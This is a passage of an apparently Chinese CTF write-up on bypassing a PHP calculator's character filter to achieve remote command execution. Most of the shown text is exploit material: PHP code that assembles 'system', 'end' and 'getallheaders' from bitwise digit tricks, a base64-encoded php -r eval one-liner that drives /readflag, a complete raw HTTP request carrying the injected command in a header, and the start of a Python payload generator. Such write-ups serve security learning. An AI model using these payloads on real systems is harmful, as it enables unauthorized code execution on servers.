class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;)))()</span><br></pre></td></tr></table></figure><p>后面的不拼了…… 直接用师傅们的payload</p><p>题目中断外网，并且需要<code>/readflag</code>，即需要一个shell. 进行命令执行.</p><ul><li>有几种方式</li></ul><ol><li><p>system(end(getallheaders()));</p></li><li><p>system(file_get_contents(“php://input”)); </p></li><li><p>把脚本内容写到一个文件, 最后执行  </p></li></ol><p><code>system(end(getallheaders()));的payload;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">9</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;);</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">-1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;));</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//systEm</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//n</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//EnD</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// getallheaders</span></span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">8</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)))); <span class="comment">// g</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">//T</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// h</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">2</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// r</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// s</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后需要过<code>/readflag</code>的验证码, 可以使用使用<code>Perl</code>, 也可以通过 <code>php -r &quot;&quot;</code>的方式执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure><p>最终的payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /calc.php?<span class="built_in">num</span>=(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">9</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((-<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B0</span>%7D)))(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">6</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))))((((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">8</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)%7C(((<span class="number">1.1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>((~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">4</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))).(((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">2</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))()))%3B HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.156</span><span class="number">.140</span><span class="number">.90</span>:<span class="number">8081</span></span><br><span class="line">z: php -r <span class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure><p>后面又看到了<a href="https://www.mrkaixin.top/posts/fbd7e4e1/#1-0-bypass-waf" target="_blank" rel="noopener">开心师傅的脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">""" Python</span></span><br><span class="line"><span class="string">Author: Mrkaixin</span></span><br><span class="line"><span class="string">Date: 2020-05-30 21:32</span></span><br><span class="line"><span class="string">FileName: exp.py</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">word_dict = &#123;</span><br><span class="line">    <span class="string">"0"</span>: <span class="string">"((0).(0))"</span>,</span><br><span class="line">    <span class="string">"1"</span>: <span class="string">"((1).(0))"</span>,</span><br><span class="line">    <span class="string">"2"</span>: <span class="string">"((2).(0))"</span>,</span><br><span class="line">    <span class="string">"3"</span>: <span class="string">"((3).(0))"</span>,</span><br><span class="line">    <span class="string">"4"</span>: <span class="string">"((4).(0))"</span>,</span><br><span class="line">    <span class="string">"5"</span>: <span class="string">"((5).(0))"</span>,</span><br><span class="line">    <span class="string">"6"</span>: <span class="string">"((6).(0))"</span>,</span><br><span class="line">    <span class="string">"7"</span>: <span class="string">"((7).(0))"</span>,</span><br><span class="line">    <span class="string">"8"</span>: <span class="string">"((8).(0))"</span>,</span><br><span class="line">    <span class="string">"9"</span>: <span class="string">"((9).(0))"</span>,</span><br><span class="line">    <span class="string">"="</span>: <span class="string">"(((1).(0)))|(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"+"</span>: <span class="string">"((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"."</span>: <span class="string">"((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"&lt;"</span>: <span class="string">"(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"$"</span>: <span class="string">"(((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"@"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"~"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">"&#123;"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"&#125;"</span>: <span class="string">"(((0).(0)))|((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">","</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"("</span>: <span class="string">"(((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">")"</span>: <span class="string">"(((9).(0)))%26((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"d"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"e"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"f"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"h"</span>: <span 